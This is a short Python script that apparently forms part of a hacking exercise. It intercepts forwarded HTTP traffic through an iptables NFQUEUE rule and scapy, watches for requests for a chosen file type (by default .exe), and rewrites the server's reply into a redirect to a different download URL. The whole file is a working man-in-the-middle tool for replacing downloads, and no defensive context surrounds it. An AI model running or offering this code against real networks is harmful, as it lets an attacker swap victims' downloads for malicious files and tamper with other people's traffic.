#!/usr/bin/env python3

import optparse
import netfilterqueue
import subprocess
import scapy.all as scapy


def get_parameters():
    parser = optparse.OptionParser()
    parser.add_option('-f', '--file', dest='file',
                      help='file or file type to intercept, default is exe.')
    (options, arguments) = parser.parse_args()
    if not options.file:
        options.file = 'exe'
    return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        global ack_list
        if scapy_packet[scapy.TCP].dport == 80:
            global options
            if options.file in str(scapy_packet[scapy.Raw].load):
                print("[+] " + options.file + " detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] replacing file")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.winimage.com/download/winima90.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()


options = get_parameters()
ack_list = []
try:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
